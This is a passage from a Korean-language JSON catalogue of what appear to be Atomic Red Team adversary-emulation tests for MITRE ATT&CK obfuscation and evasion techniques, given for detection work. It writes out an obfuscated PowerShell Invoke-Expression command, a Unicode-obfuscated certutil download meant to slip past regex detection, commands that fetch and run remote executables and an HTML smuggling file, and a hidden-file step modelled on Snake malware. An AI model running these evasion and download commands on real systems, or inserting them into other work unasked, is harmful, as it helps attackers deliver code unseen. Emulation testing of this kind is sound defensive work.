        "수신 서버 측에서 로그 또는 수신 데이터를 삭제하여 테스트 흔적을 정리할 수 있다.",
        "필요 시 사용된 XLSM 파일도 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "e2d85e66-cb66-4ed7-93b1-833fc56c9319"
      }
    },

    {
      "test_id": "T1027-6",
      "name": "Obfuscated Command in PowerShell",
      "platforms": ["windows"],
      "summary": "복잡한 문자열 조합, 타입 리플렉션, 숫자 배열 등을 사용해 난독화된 PowerShell 명령을 실행하여 최종적으로 \"Hello, from PowerShell!\" 문자열을 출력한다. 보고서에 등장한 실제 공격 예제를 기반으로 하는 난독화 패턴이다.",
      "procedure": [
        "여러 Type() 호출과 문자열 포매팅을 사용해 System.String, Convert 등의 .NET 타입을 동적으로 구성한다.",
        "숫자 배열과 ToInt16 변환 등을 활용해 문자 단위로 최종 문자열을 생성한다.",
        "Invoke-Expression 패턴(Invoke-Expression에 상응하는 동적 실행)을 이용해 난독화된 명령을 평가·실행한다.",
        "최종적으로 \"Hello, from PowerShell!\"이 출력된다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$cmDwhy =[TyPe](\"{0}{1}\" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE](\"{1}{0}{2}\"-f'nv','cO','ert')  ;  &(\"{0}{2}{3}{1}{4}\" -f'In','SiO','vOKe-EXp','ReS','n') (  (&(\"{1}{2}{0}\"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y')).\"v`ALUe\"::(\"{1}{0}\" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::\"t`OinT`16\"(( [sTring]${_}) ,8)))})) )"
        }
      ],
      "prerequisites": [
        "PowerShell 스크립트 실행이 허용되어 있어야 한다.",
        "일부 보안 솔루션은 난독화된 PowerShell 명령을 휴리스틱으로 탐지할 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "고도로 난독화된 스크립트를 실행해 문자열을 출력",
            "commandline_pattern": "powershell.exe *Invoke-EXpReS*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "콘솔 출력만 발생하므로 별도 클린업은 필요 없다.",
        "PowerShell Operational 로그(ETW) 등에 난독화된 스크립트 내용이 남을 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "8b3f4ed6-077b-4bdd-891c-2d237f19410f"
      }
    },

    {
      "test_id": "T1027-7",
      "name": "Obfuscated Command Line using special Unicode characters (certutil)",
      "platforms": ["windows"],
      "summary": "certutil 명령에 특수 유니코드 대시, 오른쪽-좌측(RLO)·좌측-오른쪽(LRO) 제어 문자, 문자 치환 등을 섞어 다운로드 명령을 난독화하는 예제를 모사한다. 명령줄 모양은 변형되지만 실제로는 파일을 웹에서 내려받아 로컬에 저장한다.",
      "procedure": [
        "사용자는 제공된 난독화 certutil 명령을 복사하여 커맨드 프롬프트에 붙여넣는다.",
        "명령 내 #{remote_file}, #{local_path}를 실제 URL과 저장할 파일명으로 치환한다.",
        "명령을 실행하면 certutil이 HTTP(S)로 원격 파일을 요청하고, 로컬 경로에 저장한다.",
        "명령 줄에는 다양한 유니코드·제어 문자가 포함되어 있어 정규식 기반 탐지를 회피할 수 있다."
      ],
      "commands": [
        {
          "executor": "manual",
          "elevation_required": false,
          "command": "certutil —ૹu૰rlࢰca࣢c෯he  –‮spli؅t‮‭ −\"൏ᶠ൸\" #{remote_file} #{local_path}"
        }
      ],
      "prerequisites": [
        "시스템에 certutil.exe가 존재해야 한다(기본 Windows 구성 요소).",
        "원격 URL(#{remote_file})에 HTTP(S) 접근이 가능해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "#{local_path}",
            "description": "certutil이 원격에서 다운로드해 저장한 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "certutil.exe",
            "description": "난독화된 인자를 사용해 원격 파일을 다운로드",
            "commandline_pattern": "certutil *urlcache* *split* *"
          }
        ],
        "network": [
          {
            "description": "certutil이 #{remote_file}로 HTTP(S) 요청을 전송",
            "destination": "#{remote_file}"
          }
        ]
      },
      "cleanup": [
        "#{local_path}로 저장된 다운로드 파일을 삭제하여 흔적을 제거할 수 있다.",
        "certutil 로그 및 프록시/웹 게이트웨이 로그에서 관련 요청을 찾아 삭제 또는 표시할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "e68b945c-52d0-4dd9-a5e8-d173d70c448f"
      }
    },

    {
      "test_id": "T1027-8",
      "name": "Snake Malware Encrypted crmlog file",
      "platforms": ["windows"],
      "summary": "Snake 악성코드 캠페인에서 관찰된 것처럼, 특정 경로에 암호화된 crmlog 파일을 생성하고 Hidden, System, Archive 속성을 부여해 은닉하는 동작을 재현한다. 이후 커널 드라이버나 별도 컴포넌트가 이 파일을 복호화해 사용할 수 있다.",
      "procedure": [
        "Windows 시스템 디렉터리(%windir%) 하위 registration 폴더에 GUID 형태의 파일명을 가진 .crmlog 파일을 생성한다.",
        "PowerShell에서 파일 객체의 Attributes를 Hidden, System, Archive로 설정하여 탐색기 기본 보기에서 보이지 않도록 한다.",
        "콘솔에 생성된 파일 경로를 출력해 생성 여부를 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\""
        }
      ],
      "prerequisites": [
        "관리자 권한 또는 %windir%\\registration 경로에 파일을 생성·수정할 수 있는 권한이 필요하다.",
        "해당 경로에 대한 보안 솔루션 모니터링 정책이 존재할 수 있으므로, 테스트 환경에서 수행해야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "%windir%\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog",
            "description": "Hidden/System/Archive 속성이 설정된 암호화/난독화 로그 파일"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "새 crmlog 파일을 생성하고 속성을 변경",
            "commandline_pattern": "powershell.exe *New-Item*registration*crmlog*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "클린업 스크립트로 해당 crmlog 파일을 삭제할 수 있다.",
        "%windir%\\registration 경로를 점검해 추가로 생성된 수상한 crmlog 파일이 있는지 확인할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "7e47ee60-9dd1-4269-9c4f-97953b183268"
      }
    },

    {
      "test_id": "T1027-9",
      "name": "Execution from Compressed JScript File (Gootloader-style)",
      "platforms": ["windows"],
      "summary": "압축 파일(t1027js.zip) 안에 포함된 JScript 파일을 다운로드·압축 해제한 뒤 실행해 계산기를 띄우는 시나리오를 모사한다. 이는 Gootloader 등이 사용하는, 압축된 스크립트 기반 페이로드 전달 및 실행 패턴을 재현한다.",
      "procedure": [
        "외부 URL에서 t1027js.zip을 다운로드한다.",
        "지정된 폴더에 압축을 해제해 T1027js.js 파일을 생성한다.",
        "T1027js.js를 실행하여(기본 Windows Script Host 연관) 내부에서 계산기 실행 등의 페이로드를 수행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "New-Item -Type Directory \"PathToAtomicsFolder..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"#{url_path}\" -OutFile \"PathToAtomicsFolder..\\ExternalPayloads\\T1027js.zip\"\nExpand-Archive -path \"PathToAtomicsFolder..\\ExternalPayloads\\T1027js.zip\" -DestinationPath \"PathToAtomicsFolder..\\ExternalPayloads\\temp_T1027js.zip\\\" -Force"
        },
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "PathToAtomicsFolder..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js"
        }
      ],
      "prerequisites": [
        "Windows Script Host(기본 wscript.exe/cscript.exe)가 활성화되어 있어야 한다.",
        "외부 URL(#{url_path})에 HTTP(S)로 접근 가능해야 하며, Invoke-WebRequest 및 Expand-Archive 사용이 허용되어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1027js.zip",
            "description": "다운로드된 JScript 압축 파일"
          },
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js",
            "description": "압축 해제된 JScript 페이로드"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027js.zip\\T1027js.js",
            "description": "Windows Script Host에 의해 실행되는 스크립트 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "wscript.exe / cscript.exe",
            "description": "T1027js.js 스크립트를 실행하는 Windows Script Host"
          },
          {
            "name": "calculator.exe / CalculatorApp.exe",
            "description": "테스트 성공 시 실행되는 계산기 프로세스"
          }
        ],
        "network": [
          {
            "description": "Invoke-WebRequest가 #{url_path}에 대한 HTTP(S) 다운로드 요청을 수행",
            "destination": "#{url_path}"
          }
        ]
      },
      "cleanup": [
        "taskkill /f /im calculator.exe 등을 통해 실행된 계산기를 종료할 수 있다.",
        "T1027js.zip, temp_T1027js.zip 폴더 및 T1027js.js 파일을 삭제해 테스트 흔적을 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "fad04df1-5229-4185-b016-fb6010cd87ac"
      }
    }
  ]
},
{
  "technique_id": "T1027.004",
  "technique_name": "Obfuscated Files or Information: Compile After Delivery",
  "tactic": "Defense Evasion",
  "description": "Compile After Delivery는 대상 시스템에 소스 코드나 중간 형태(스크립트, C#/C 코드 등)만 전달한 뒤, 실행 시점에 로컬 컴파일러(csc.exe, gcc 등)를 이용해 바이너리를 생성·실행하는 기법이다. 이를 통해 네트워크 구간이나 디스크 상에서 최종 악성 실행 파일이 직접 관찰되지 않게 하여 탐지를 회피하고, 동적으로 페이로드를 언팩·실행하는 데 활용된다.",

  "tests": [
    {
      "test_id": "T1027.004-1",
      "name": "Compile After Delivery using csc.exe",
      "platforms": ["windows"],

      "summary": "전달된 C# 소스(calc.cs)를 .NET C# 컴파일러(csc.exe)를 통해 로컬에서 컴파일해 T1027.004.exe를 생성하는 시나리오다. 이는 공격자가 소스 코드를 먼저 투하한 뒤, 피해 시스템에서 최종 실행 파일을 만들어 실행하는 Compile After Delivery 패턴을 모사한다.",

      "procedure": [
        "지정된 경로(PathToAtomicsFolder\\T1027.004\\src\\calc.cs)에 C# 소스 파일이 존재하는지 확인한다.",
        "소스 파일이 없으면 Invoke-WebRequest를 이용해 GitHub에서 calc.cs를 다운로드한다.",
        "명령 프롬프트에서 csc.exe를 호출해 /out 인자를 사용, calc.cs를 C:\\Windows\\Temp\\T1027.004.exe로 컴파일한다.",
        "생성된 T1027.004.exe는 calc.exe를 숨겨진 cmd.exe 창을 통해 실행하는 기능을 포함한다.",
        "테스트 종료 시 생성된 실행 파일(T1027.004.exe)을 삭제한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "if (-not (Test-Path \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\")) {\n  New-Item -Type Directory (Split-Path \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\") -ErrorAction Ignore | Out-Null\n  Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs\" -OutFile \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\"\n}"
        },
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe \"PathToAtomicsFolder\\T1027.004\\src\\calc.cs\""
        }
      ],

      "prerequisites": [
        "테스트 시스템에 .NET Framework C# 컴파일러(csc.exe)가 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe 경로에 존재해야 한다.",
        "인터넷이 허용되어 있을 경우, PowerShell Invoke-WebRequest를 통해 calc.cs를 GitHub에서 다운로드할 수 있어야 한다.",
        "C:\\Windows\\Temp 경로에 파일을 생성할 수 있는 쓰기 권한이 필요하다.",
        "경로 규칙에 따라 PathToAtomicsFolder\\T1027.004\\src 디렉터리를 생성할 수 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1027.004\\src\\calc.cs",
            "description": "원격에서 다운로드되거나 미리 배치된 C# 소스 코드(숨겨진 cmd를 통해 calc.exe를 실행하는 예제 코드)"
          },
          {
            "path": "C:\\Windows\\Temp\\T1027.004.exe",
            "description": "csc.exe로 컴파일된 최종 실행 파일(Compile After Delivery 결과물)"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1027.004\\src\\calc.cs",
            "description": "csc.exe가 입력으로 사용하는 C# 소스 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "calc.cs 다운로드(Invoke-WebRequest) 및 사전 조건 스크립트 실행에 사용된 PowerShell 프로세스",
            "commandline_pattern": "powershell.exe *Invoke-WebRequest*calc.cs*"
          },
          {
            "name": "csc.exe",
            "description": "C# 소스를 T1027.004.exe로 컴파일하기 위해 실행된 .NET C# 컴파일러",
            "commandline_pattern": "*csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe*calc.cs*"
          }
        ],
        "network": [
          {
            "description": "GitHub에서 C# 소스(calc.cs)를 다운로드하기 위한 HTTP/HTTPS 아웃바운드 요청",
            "pattern": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs"
          }
        ]
      },

      "cleanup": [
        "C:\\Windows\\Temp\\T1027.004.exe 파일이 존재하면 삭제해 테스트로 생성된 실행 파일을 제거한다.",
        "원할 경우 PathToAtomicsFolder\\T1027.004\\src\\calc.cs도 삭제해 소스 코드 흔적을 제거할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "ffcdbd6a-b0e8-487d-927a-09127fe9a206"
      }
    },

    {
      "test_id": "T1027.004-2",
      "name": "Dynamic C# Compile",
      "platforms": ["windows"],

      "summary": "T1027.004_DynamicCompile.exe를 실행해, 내부에서 C# 코드를 동적으로 컴파일/로드하는 동작을 트리거하는 시나리오다. 이 과정에서 .cmdline 파일 등이 생성될 수 있으며, 디스크에 별도의 소스 파일을 남기지 않고 런타임에 페이로드를 언팩·실행하는 패턴을 재현한다.",

      "procedure": [
        "지정된 경로(PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe)에 테스트용 exe가 존재하는지 확인한다.",
        "존재하지 않을 경우 Invoke-WebRequest를 사용해 GitHub에서 T1027.004_DynamicCompile.exe를 다운로드한다.",
        "PowerShell에서 Invoke-Expression으로 T1027.004_DynamicCompile.exe를 실행한다.",
        "프로그램은 내부에서 C# 코드를 동적으로 컴파일하고 실행하는 과정을 거치며, 콘솔에 'T1027.004 Dynamic Compile' 문자열을 출력한다.",
        "실행 중 임시 .cmdline 파일 등 C# 컴파일 산출물이 생성될 수 있으며, 이는 DFIR 관점에서 흔적으로 분석 가능하다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "if (-not (Test-Path \"PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\")) {\n  Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile \"PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\"\n}"
        },
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Invoke-Expression \"PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe\""
        }
      ],

      "prerequisites": [
        "PathToAtomicsFolder\\T1027.004\\bin 경로에 T1027.004_DynamicCompile.exe 파일을 저장할 수 있어야 한다.",
        "인터넷이 허용되어 있을 경우, PowerShell Invoke-WebRequest를 통해 exe를 GitHub에서 다운로드할 수 있어야 한다.",
        "테스트 시스템에 .NET 런타임 및 C# 동적 컴파일을 수행할 수 있는 환경(예: .NET Framework)이 구성되어 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe",
            "description": "동적 C# 컴파일 데모 기능을 포함한 실행 파일(원격에서 다운로드 가능)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "Invoke-WebRequest로 exe를 다운로드하고 Invoke-Expression으로 실행하는 PowerShell 프로세스",
            "commandline_pattern": "powershell.exe *Invoke-WebRequest* T1027.004_DynamicCompile.exe*"
          },
          {
            "name": "T1027.004_DynamicCompile.exe",
            "description": "실행 중 내부에서 C# 코드를 동적으로 컴파일하고 'T1027.004 Dynamic Compile' 메시지를 출력하는 테스트용 프로세스",
            "commandline_pattern": "*T1027.004_DynamicCompile.exe*"
          }
        ],
        "network": [
          {
            "description": "GitHub에서 T1027.004_DynamicCompile.exe를 다운로드하기 위한 HTTP/HTTPS 요청",
            "pattern": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe"
          }
        ]
      },

      "cleanup": [
        "원한다면 PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe 파일을 삭제해 테스트용 실행 파일을 제거할 수 있다.",
        "프로세스 실행 중 생성된 임시 .cmdline 파일 등은 프로세스 종료 또는 시스템 정리에 따라 자동 삭제될 수 있으나, 남아 있는 경우 수동으로 삭제할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "453614d8-3ba6-4147-acc0-7ec4b3e1faef"
      }
    }
  ]
},
{
  "technique_id": "T1027.006",
  "technique_name": "HTML Smuggling",
  "tactic": "Defense Evasion",
  "description": "HTML Smuggling은 브라우저가 제공하는 기능(HTML5, JavaScript, Blob, URL.createObjectURL 등)을 악용해, 네트워크 상으로는 평범한 HTML/스크립트만 전송하고 실제 악성 페이로드(ISO, EXE 등)는 브라우저 내부에서 재구성·다운로드시키는 기법이다. 이를 통해 프록시/게이트웨이 등 전통적인 보안 장비의 파일 검사 우회를 노릴 수 있으며, 초기 침투 및 페이로드 전달 단계에서 자주 활용된다.",

  "tests": [
    {
      "test_id": "T1027.006-1",
      "name": "HTML Smuggling Remote Payload",
      "platforms": ["windows"],

      "summary": "사전에 준비된 HTML 파일(T1027_006_Remote.html)을 실행해, 사용자 상호작용 없이 원격 ISO 파일(FeelTheBurn.iso)을 다운로드하는 HTML Smuggling 시나리오를 재현한다. 브라우저는 단순 HTML을 여는 것처럼 보이지만, 내부 스크립트가 원격 리소스를 내려 받아 로컬 Downloads 폴더에 저장한다.",

      "procedure": [
        "지정된 경로(PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html)에 HTML 스머글링용 파일이 존재하는지 확인한다.",
        "파일이 없으면 PowerShell Invoke-WebRequest를 사용해 GitHub 저장소에서 T1027_006_Remote.html을 다운로드하고, 해당 경로에 저장한다.",
        "PowerShell에서 & 연산자를 사용해 T1027_006_Remote.html을 실행(연결된 기본 브라우저로 열기)한다.",
        "브라우저는 HTML 내부 스크립트에 의해 T1553.005에서 사용하는 FeelTheBurn.iso를 원격에서 자동 다운로드한다.",
        "테스트 종료 후, 현재 사용자 프로파일의 Downloads 폴더에 생성된 FeelTheBurn.iso 파일을 삭제해 흔적을 정리할 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "if (-not (Test-Path \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\")) {\n  New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction Ignore | Out-Null\n  Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"\n}"
        },
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "& \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\""
        }
      ],

      "prerequisites": [
        "테스트 시스템에 PowerShell이 설치되어 있어야 한다(Windows 기본 포함).",
        "인터넷이 허용되어 있을 경우, GitHub에서 T1027_006_Remote.html을 다운로드할 수 있어야 한다.",
        "PathToAtomicsFolder\\T1027.006\\bin\\ 경로에 디렉터리 및 파일을 생성할 수 있는 권한이 필요하다.",
        "기본 웹 브라우저가 .html 파일을 열 수 있는 상태여야 하며, 사용자의 Downloads 폴더에 파일을 저장할 수 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html",
            "description": "GitHub에서 다운로드된 HTML Smuggling 예제 파일(원격 ISO 다운로드 로직 포함)"
          },
          {
            "path": "C:\\Users\\<username>\\Downloads\\FeelTheBurn.iso",
            "description": "HTML 파일 실행 시 브라우저에 의해 자동으로 다운로드되는 ISO 페이로드 파일"
          }
        ],
        "files_read": [
          {
            "path": "PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html",
            "description": "브라우저가 로드하는 HTML 컨텐츠(내부 JavaScript를 통해 원격 ISO를 요청)"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "HTML 파일 존재 여부 확인, 다운로드(Invoke-WebRequest), 그리고 HTML 실행(& 연산자)에 사용된 PowerShell 프로세스",
            "commandline_pattern": "powershell.exe *Invoke-WebRequest* T1027_006_Remote.html*"
          },
          {
            "name": "browser.exe",
            "description": "기본 웹 브라우저 프로세스(예: msedge.exe, chrome.exe, iexplore.exe 등)로, HTML을 열고 내부 스크립트를 통해 ISO 다운로드를 수행한다.",
            "commandline_pattern": "*.exe *T1027_006_Remote.html*"
          }
        ],
        "network": [
          {
            "description": "HTML 내부 스크립트가 트리거하는 원격 ISO 다운로드 요청(FeelTheBurn.iso)",
            "pattern": "https://github.com/redcanaryco/atomic-red-team/*/FeelTheBurn.iso"
          }
        ]
      },

      "cleanup": [
        "현재 사용자 프로파일 기준 C:\\Users\\<username>\\Downloads\\FeelTheBurn.iso 파일을 삭제한다.",
        "원할 경우 PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html 파일도 삭제해 HTML Smuggling 테스트 파일 흔적을 제거할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "30cbeda4-08d9-42f1-8685-197fad677734"
      }
    }
  ]
},
{
  "technique_id": "T1027.007",
  "technique_name": "Obfuscated Files or Information: Dynamic API Resolution",
  "tactic": "Defense Evasion",
  "description": "Dynamic API Resolution은 API 이름을 직접 호출하지 않고 해시값이나 동적 탐색을 이용해 런타임에 주소를 구해 호출하는 기법이다. 이를 통해 IAT(Import Address Table) 분석을 어렵게 만들고, 보안 솔루션의 시그니처/후킹을 우회하려는 목적이 있다. 특히 직접 시스템 콜(syscall)을 구성해 호출하는 방식과 결합되면, 커널 훅 기반 모니터링을 회피하는 드롭퍼·로더 단계에서 자주 활용된다.",

  "tests": [
    {
      "test_id": "T1027.007-1",
      "name": "Dynamic API Resolution-Ninja-syscall",
      "platforms": ["windows"],

      "summary": "ninja_syscall1.exe를 실행해 NtCreateFile을 API 해싱과 동적 syscall 해석 방식으로 호출하는 시나리오를 재현한다. 성공 시 기본 사용자 프로필의 Temp 폴더에 hello.log 파일을 생성한 뒤, 동일 스크립트 내에서 삭제까지 수행한다. 동적 API 호출과 파일 생성 흔적을 DFIR 관점에서 관찰할 수 있다.",

      "procedure": [
        "지정된 경로(PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe)에 실행 파일이 존재하는지 확인한다.",
        "파일이 없으면 PowerShell Invoke-WebRequest를 사용해 GitHub에서 ninja_syscall1.exe를 다운로드하고 해당 경로에 저장한다.",
        "PowerShell에서 Start-Process 명령으로 ninja_syscall1.exe를 실행한 뒤, Start-Sleep -Seconds 7로 동작 완료를 기다린다.",
        "실행된 ninja_syscall1.exe는 동적 API 해석과 syscall 조합(‘Ninja-syscall’)을 이용해 NtCreateFile을 호출하고, C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log 파일을 생성한다.",
        "PowerShell 스크립트는 hello.log 존재 여부를 확인하고, 존재하면 파일을 삭제한 뒤 \"[+] hello.log removed.\" 메시지를 출력한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "if (-not (Test-Path \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\")) {\n  New-Item -Type Directory (Split-Path \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\") -ErrorAction Ignore | Out-Null\n  Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.007/bin/ninja_syscall1.exe\" -OutFile \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\"\n}\nStart-Process \"PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe\"\nStart-Sleep -Seconds 7\nif (Test-Path \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\") { Remove-Item \"C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log\" -Force; Write-Host \"[+] hello.log removed.\" }"
        }
      ],

      "prerequisites": [
        "테스트 시스템이 Windows이며 PowerShell이 사용 가능해야 한다.",
        "인터넷이 허용되어 있을 경우, GitHub에서 ninja_syscall1.exe를 다운로드할 수 있어야 한다.",
        "PathToAtomicsFolder\\T1027.007\\bin\\ 경로에 디렉터리 및 파일을 생성할 수 있는 권한이 필요하다.",
        "C:\\Users\\Default\\AppData\\Local\\Temp\\ 경로에 파일을 생성·삭제할 수 있는 권한이 있어야 한다."
      ],

      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log",
            "description": "ninja_syscall1.exe가 NtCreateFile 동적 syscall 호출을 통해 생성하는 로그 파일(테스트 중 곧바로 삭제될 수 있음)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "ninja_syscall1.exe 실행 및 대기, hello.log 존재 확인과 삭제를 수행하는 스크립트 실행 프로세스",
            "commandline_pattern": "powershell.exe *Start-Process* ninja_syscall1.exe*"
          },
          {
            "name": "ninja_syscall1.exe",
            "description": "API 해싱과 동적 syscall 해석(‘Ninja-syscall’)을 통해 NtCreateFile을 호출해 hello.log를 생성하는 PE 바이너리",
            "commandline_pattern": "PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe"
          }
        ],
        "network": []
      },

      "cleanup": [
        "C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log 파일이 남아 있는 경우 삭제한다.",
        "테스트 환경을 초기화하려면 PathToAtomicsFolder\\T1027.007\\bin\\ninja_syscall1.exe 파일도 제거해 해당 바이너리 흔적을 삭제할 수 있다."
      ],

      "metadata": {
        "atomic_source_id": "578025d5-faa9-4f6d-8390-aae739d507e1"
      }
    }
  ]
},
{
"technique_id": "T1027.013",
"technique_name": "Obfuscated Files or Information: Encrypted/Encoded File",
"tactic": "Defense Evasion",
"description": "암호화·인코딩된 페이로드나 문자열을 파일 형태로 보관했다가, 실행 시점에 복호화/디코딩하여 사용하는 기법이다. 정적 분석 단계에서 악성 코드의 내용을 숨기고, 시그니처 기반 탐지를 피하기 위한 목적으로 자주 사용된다. EICAR 테스트 문자열처럼, 탐지 우회 또는 탐지 튜닝을 위해 의도적으로 인코딩/암호화된 페이로드를 디스크에 풀어 쓰는 시나리오에서 관찰될 수 있다.",

"tests": [
{
"test_id": "T1027.013-1",
"name": "Decode Eicar File and Write to File",
"platforms": ["windows"],
  "summary": "Base64로 인코딩된 EICAR 문자열을 PowerShell에서 디코딩하여 텍스트 파일로 저장하는 시나리오를 재현한다. 이 과정에서 AV/EDR이 디코딩된 악성 패턴(EICAR)을 파일 생성 시점에 탐지할 수 있는지 확인할 수 있다.",

  "procedure": [
    "PowerShell 스크립트 내에 하드코딩된 Base64 인코딩 문자열(유사 EICAR 테스트 패턴)을 $encodedString 변수에 저장한다.",
    "System.Convert.FromBase64String을 사용해 $encodedString 값을 바이트 배열로 디코딩한다.",
    "System.Text.Encoding.UTF8.GetString을 사용해 디코딩된 바이트 배열을 문자열 형태로 변환한다.",
    "변환된 문자열(디코딩된 EICAR 패턴)을 Out-File을 사용해 현재 작업 디렉터리에 T1027.013_decodedEicar.txt 이름으로 저장한다."
  ],

  "commands": [
    {
      "executor": "powershell",
      "elevation_required": false,
      "command": "$encodedString = \"WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=\"\n$bytes = [System.Convert]::FromBase64String($encodedString)\n$decodedString = [System.Text.Encoding]::UTF8.GetString($bytes)\n\n#write the decoded eicar string to file\n$decodedString | Out-File T1027.013_decodedEicar.txt"
    }
  ],

  "prerequisites": [
    "Windows 환경에서 PowerShell이 사용 가능해야 한다.",
    "현재 작업 디렉터리에 파일을 생성할 수 있는 권한이 필요하다.",
    "일부 AV/EDR 환경에서는 EICAR 패턴 생성 자체가 차단될 수 있으므로, 사전에 테스트 정책을 확인해야 한다."
  ],

